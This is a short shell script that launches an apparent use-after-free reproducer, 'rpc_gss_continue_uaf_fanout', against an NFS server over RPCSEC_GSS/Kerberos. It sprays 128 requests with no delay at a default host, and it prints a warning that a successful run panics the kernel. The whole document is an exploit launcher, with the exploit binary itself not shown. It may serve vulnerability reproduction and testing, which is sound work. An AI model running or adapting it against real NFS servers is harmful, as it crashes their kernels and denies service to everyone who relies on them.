#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
HOST=${1:-192.168.64.84}
SERVICE=${2:-nfs@tests-virtual-machine.local}
COUNT=${RPC_GSS_SPRAY_COUNT:-128}

echo "WARNING: a successful run panics the kernel."
echo "target=$HOST service=$SERVICE uid=$(id -u) requests=$COUNT"

export KRB5_CONFIG="$DIR/krb5.conf"
export KRB5CCNAME="FILE:$DIR/test_only.ccache"
export RPC_GSS_SPRAY_TOKEN_FILE="$DIR/continue_token.des3.client.bin"
export RPC_GSS_SPRAY_COUNT="$COUNT"
export RPC_GSS_SPRAY_DELAY_US=0
export RPC_GSS_SPRAY_STAGGER_US=0

exec "$DIR/rpc_gss_continue_uaf_fanout" \
  "$HOST" \
  "$SERVICE" \
  "$DIR/repro.client.bin" \
  "$DIR/repro.server.bin" \
  0 0 0 0 8
